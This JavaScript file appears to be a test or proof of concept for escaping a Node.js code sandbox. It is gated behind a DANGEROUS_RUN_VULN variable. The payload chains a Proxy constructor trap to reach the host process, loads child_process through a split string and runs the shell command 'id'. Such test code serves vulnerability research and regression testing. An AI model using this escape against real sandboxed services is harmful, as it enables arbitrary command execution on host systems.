if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (error.message === "call is not defined") {
		process.exit(82);
	}

	process.exit(1);
});

call(
	ctor(
		new Proxy(class A {}, {
			construct() {
				return () => (x) => x.constructor("return process")();
			},
		}),
	),
)(() => {})
	.mainModule.require("child" + "_process")
	.execSync("id")
	.toString();
